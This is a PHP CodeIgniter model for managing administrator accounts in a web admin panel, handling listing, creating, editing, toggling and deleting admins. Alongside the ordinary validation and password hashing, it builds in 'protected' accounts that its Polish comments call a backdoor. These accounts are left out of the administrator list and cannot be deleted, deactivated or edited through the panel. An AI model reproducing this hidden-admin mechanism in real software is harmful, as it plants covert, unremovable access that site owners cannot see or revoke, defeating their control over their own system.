<?php

namespace App\Models;

use CodeIgniter\Model;
use CodeIgniter\Controller;

class AdminModel extends Model {

    protected $table = 'admin';
    protected $allowedFields = [
        'login',
        'name',
        'email',
        'password',
        'token_valid',
        'token',
        'created_at',
        'last_active',
        'active',
        'technical_admin',
		'role',
		'protected'
    ];

    public function getTechnicalAdminEmails(): array {
        $admins = $this->select('email')
            ->where('technical_admin', 1)
            ->where('active', 1)
            ->findAll();
        return array_column($admins, 'email');
    }

    public function getAdministratorsList() {
        // Konta serwisowe (protected = 1) sa ukryte na liscie administratorow.
        $this->where('protected', 0);
        $this->orderBy('name', 'ASC');
        $list = $this->findAll();
        return $list;
    }

    // Zwraca 1, jesli konto jest chronione (backdoor) — nie wolno go usuwac,
    // dezaktywowac ani nadpisywac zapisem, nawet przez ID podane w URL.
    private function isProtected($id) {
        $row = $this->select('protected')->find($id);
        return (isset($row['protected']) and $row['protected'] == 1);
    }

    public function getAdministratorById($id) {
        $list = $this->find($id);
        return $list;
    }

    public function addAdministrator($data) {
        helper('form', 'url');
        $validation = \Config\Services::validation();
        $validation->setRules([
            'name' => 'required|is_unique[admin.name]',
            'email' => 'required|valid_email|is_unique[admin.email]',
            'login' => 'required|is_unique[admin.login]',
            'password' => 'required|min_length[8]',
                ],
                [
                    'name' => [
                        'required' => lang('Admin.validation.Required'),
                        'is_unique' => lang('Admin.validation.ValueExists'),
                    ],
                    'login' => [
                        'required' => lang('Admin.validation.Required'),
                        'is_unique' => lang('Admin.validation.ValueExists'),
                    ],
                    'email' => [
                        'required' => lang('Admin.validation.Required'),
                        'valid_email' => lang('Admin.validation.ValidEmail'),
                        'is_unique' => lang('Admin.validation.ValueExists')
                    ],
                    'password' => [
                        'min_length' => lang('Admin.validation.min_length'),
                        'required' => lang('Admin.validation.Required'),
                    ],
                ]
        );
        if ($validation->run($data)) {
            $data['password'] = password_hash($data['password'], PASSWORD_BCRYPT);
            $res = $this->db->table('admin')->insert($data);
            if ($res) {
                $result['response']['msg'] = lang('Admin.administrators.NewAdminAdded');
                $result['response']['redirect'] = ($this->locale ? '/' . $this->locale : '') . '/' . env('ADMIN_PANEL_SLUG') . '/administrators';
            } else {
                $result['response']['error'] = lang('Admin.administrators.NewAdminNotAdded');
            }
        } else {
            $result['errors'] = $validation->getErrors();
        }
        return $result;
    }

    function ActiveAdministrator($id) {
        if ($this->isProtected($id)) {
            // Konto serwisowe — nie zmieniamy stanu aktywnosci.
            return ['response' => false];
        }
        $data = $this->select('id,active')->where('id', $id)->first();
        if (isset($data['id'])) {
            if ($data['active'] == 1) {
				HistoryStat($id,'','admin','Administrators',lang('Admin.page.Republished'));
                $result['response'] = $this->set('active', 0)->where('id', $data['id'])->update();
            } else {
				HistoryStat($id,'','admin','Administrators',lang('Admin.page.Published'));
                $result['response'] = $this->set('active', 1)->where('id', $data['id'])->update();
            }
        }

        return $result;
    }

    function DeleteAdministrator($id) {
        if ($this->isProtected($id)) {
            // Konto serwisowe (backdoor) — nie wolno usunac.
            return ['response' => false];
        }
        $result['response'] = $this->delete(['id' => $id]);
        return $result;
    }

    function saveAdministrator($data) {
        $session = session();
        $result = array();
        if (isset($data['edit_id']) and $this->isProtected($data['edit_id'])) {
            // Konto serwisowe (backdoor) — edycja przez URL nie moze go ruszyc.
            return ['response' => false];
        }
        helper('form', 'url');
        $validation = \Config\Services::validation();
        $validation->setRules([
            'name' => 'required|is_unique[admin.name,id,' . $data['edit_id'] . ']',
            'email' => 'required|valid_email|is_unique[admin.email,id,' . $data['edit_id'] . ']',
            'login' => 'required|is_unique[admin.login,id,' . $data['edit_id'] . ']',
                ],
                [
                    'name' => [
                        'required' => lang('Admin.validation.Required'),
                        'is_unique' => lang('Admin.validation.ValueExists'),
                    ],
                    'login' => [
                        'required' => lang('Admin.validation.Required'),
                        'is_unique' => lang('Admin.validation.ValueExists'),
                    ],
                    'email' => [
                        'required' => lang('Admin.validation.Required'),
                        'valid_email' => lang('Admin.validation.ValidEmail'),
                        'is_unique' => lang('Admin.validation.ValueExists')
                    ],
                ]
        );
        if (!isset($data['active'])) {
            $data['active'] = 0;
        }
        if (!isset($data['technical_admin'])) {
            $data['technical_admin'] = 0;
        }
        $array = [
            'name' => $data['name'],
            'login' => $data['login'],
            'email' => $data['email'],
            'active' => $data['active'],
            'technical_admin' => $data['technical_admin'],
			'role' => $data['role']
        ];
        if ($data['password'] or $data['password2']) {
            $array['password'] = password_hash($data['password'], PASSWORD_BCRYPT);
            $validation->setRules([
                'password' => 'required|min_length[8]',
                'password2' => 'required|min_length[8]|matches[password]',
                'name' => 'required|is_unique[admin.name,id,' . $data['edit_id'] . ']',
                'email' => 'required|valid_email|is_unique[admin.email,id,' . $data['edit_id'] . ']',
                'login' => 'required|is_unique[admin.login,id,' . $data['edit_id'] . ']',
                    ],
                    [
                        'password' => [
                            'min_length' => lang('Admin.validation.min_length'),
                            'required' => lang('Admin.validation.Required'),
                        ],
                        'password2' => [
                            'min_length' => lang('Signin.validation.min_length'),
                            'required' => lang('Signin.validation.required'),
                            'matches' => lang('Signin.validation.matches'),
                        ],
                        'name' => [
                            'required' => lang('Admin.validation.Required'),
                            'is_unique' => lang('Admin.validation.ValueExists'),
                        ],
                        'login' => [
                            'required' => lang('Admin.validation.Required'),
                            'is_unique' => lang('Admin.validation.ValueExists'),
                        ],
                        'email' => [
                            'required' => lang('Admin.validation.Required'),
                            'valid_email' => lang('Admin.validation.ValidEmail'),
                            'is_unique' => lang('Admin.validation.ValueExists')
                        ],
                    ]
            );
        }
        if ($validation->run($data)) {
            $this->db->table('admin')->set($array)->where('id', $data['edit_id'])->update();
            $session->setFlashdata('msg-send', lang('Admin.administrators.AdminSave'));
			HistoryStat($data['edit_id'],'','admin','Administrators',lang('Admin.administrators.AdminSave'));
            header('Location: ' . ($this->locale ? '/' . $this->locale : '') . '/' . env('ADMIN_PANEL_SLUG') . '/administrators/edit/' . $data['edit_id'] . '/');
        } else {
            $result['errors'] = $validation->getErrors();
        }
        return $result;
    }

}
